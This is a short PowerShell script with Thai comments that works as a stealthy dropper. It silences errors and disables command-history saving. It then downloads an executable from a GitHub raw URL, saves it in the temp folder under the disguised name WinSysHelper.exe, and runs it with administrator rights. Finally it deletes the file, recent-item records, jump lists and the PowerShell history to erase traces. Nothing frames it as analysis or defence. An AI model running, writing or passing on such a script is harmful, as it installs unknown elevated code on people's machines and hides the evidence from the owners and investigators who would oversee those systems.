# ปิดการแจ้งเตือน Error และปิดการบันทึกประวัติทันที
$ErrorActionPreference = 'SilentlyContinue'
$ProgressPreference = 'SilentlyContinue'
try { Set-PSReadlineOption -HistorySaveStyle SaveNothing } catch {}

# ตั้งค่าที่อยู่ไฟล์ (ใช้ Temp เพื่อเลี่ยงปัญหา Permission)
$url = "https://github.com/silentaimv1-png/basxpanel/raw/refs/heads/main/BASX.exe"
$output = "$env:TEMP\WinSysHelper.exe"

# ดาวน์โหลดและรัน
Invoke-WebRequest -Uri $url -OutFile $output
$process = Start-Process -FilePath $output -Verb RunAs -PassThru
if ($process) { $process | Wait-Process }

# ล้างร่องรอยทั้งหมด
Start-Sleep -Seconds 2
Remove-Item -Path $output -Force
Remove-Item -Path "$env:APPDATA\Microsoft\Windows\Recent\WinSysHelper*" -Force
Get-ChildItem -Path "$env:APPDATA\Microsoft\Windows\Recent\AutomaticDestinations" | Remove-Item -Force
Remove-Item (Get-PSReadlineOption).HistorySavePath -Force

exit
